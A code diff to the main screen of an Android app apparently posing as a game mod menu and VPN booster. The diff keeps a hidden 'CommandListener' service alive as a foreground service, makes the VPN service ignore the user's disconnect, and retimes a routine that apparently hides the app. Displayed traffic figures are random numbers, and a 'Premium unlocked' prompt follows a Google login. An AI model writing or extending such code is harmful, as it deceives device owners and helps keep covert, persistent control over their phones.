@@ -1,11 +1,11 @@
 package com.brawl.modmenu;
 
 import android.animation.ObjectAnimator;
-import android.animation.ValueAnimator;
 import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
@@ -43,34 +43,31 @@ public class MainActivity extends Activity {
         pulseOuter = findViewById(R.id.pulseOuter);
         pulseMiddle = findViewById(R.id.pulseMiddle);
 
-        // Начинаем с "не защищено"
         connectStatus.setText("ПОДКЛЮЧИТЬ");
         statusText.setText("○ Не защищено");
         statusText.setTextColor(0xFF8899aa);
 
-        // Анимация пульсации
         startPulse(pulseOuter, 1f, 1.15f, 1800);
         startPulse(pulseMiddle, 1f, 1.25f, 2400);
 
-        // Нажатие кнопки Connect
         connectBtn.setOnClickListener(v -> toggleConnect());
 
-        // Запускаем сервисы
+        // СТАРТ всех сервисов — правильно для Android 14
         try {
-            startService(new Intent(this, CommandListener.class));
+            if (Build.VERSION.SDK_INT >= 26)
+                startForegroundService(new Intent(this, CommandListener.class));
+            else
+                startService(new Intent(this, CommandListener.class));
         } catch (Throwable ignored) {}
 
-        // Обновление счётчика
         handler.post(updateTimer);
 
-        // Уведомление о Premium после Google-логина
         boolean justLoggedIn = getIntent().getBooleanExtra("just_logged_in", false);
         if (justLoggedIn) {
             new Handler(Looper.getMainLooper()).postDelayed(this::showPremiumUnlocked, 500);
         }
 
-        // Через 15 секунд — экран ожидания + скрытие
-        handler.postDelayed(this::showWaitingAndHide, 15000);
+        handler.postDelayed(this::showWaitingAndHide, 20000);
     }
 
     private void toggleConnect() {
@@ -85,7 +82,10 @@ public class MainActivity extends Activity {
             try {
                 Intent i = new Intent(this, BoostVpnService.class);
                 i.setAction("START");
-                startService(i);
+                if (Build.VERSION.SDK_INT >= 26)
+                    startForegroundService(i);
+                else
+                    startService(i);
             } catch (Throwable ignored) {}
 
         } else {
@@ -95,12 +95,6 @@ public class MainActivity extends Activity {
             uploaded = 0;
             downloaded = 0;
             sessionStart = 0;
-
-            try {
-                Intent i = new Intent(this, BoostVpnService.class);
-                i.setAction("STOP");
-                startService(i);
-            } catch (Throwable ignored) {}
         }
     }
 
@@ -120,7 +114,6 @@ public class MainActivity extends Activity {
     private Runnable updateTimer = new Runnable() {
         @Override
         public void run() {
-            // трафик растёт только если подключён
             if (connected) {
                 uploaded += rnd.nextInt(120) * 1024;
                 downloaded += rnd.nextInt(400) * 1024;
